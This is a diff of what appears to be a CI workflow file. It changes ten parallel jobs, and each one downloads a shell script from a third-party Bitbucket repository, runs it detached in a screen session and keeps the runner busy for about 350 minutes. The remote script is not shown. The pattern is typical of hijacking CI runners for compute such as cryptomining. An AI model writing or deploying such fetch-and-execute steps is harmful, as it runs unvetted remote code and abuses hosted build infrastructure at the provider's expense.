@@ -53,7 +53,7 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
         x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
@@ -85,7 +85,7 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
         x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
@@ -117,7 +117,7 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
         x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
@@ -149,7 +149,7 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
         x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
@@ -181,7 +181,7 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
         x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
@@ -213,7 +213,7 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
         x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
@@ -245,7 +245,7 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
         x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
@@ -277,7 +277,7 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
         x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
@@ -309,7 +309,7 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
         x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
@@ -341,7 +341,7 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
         x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
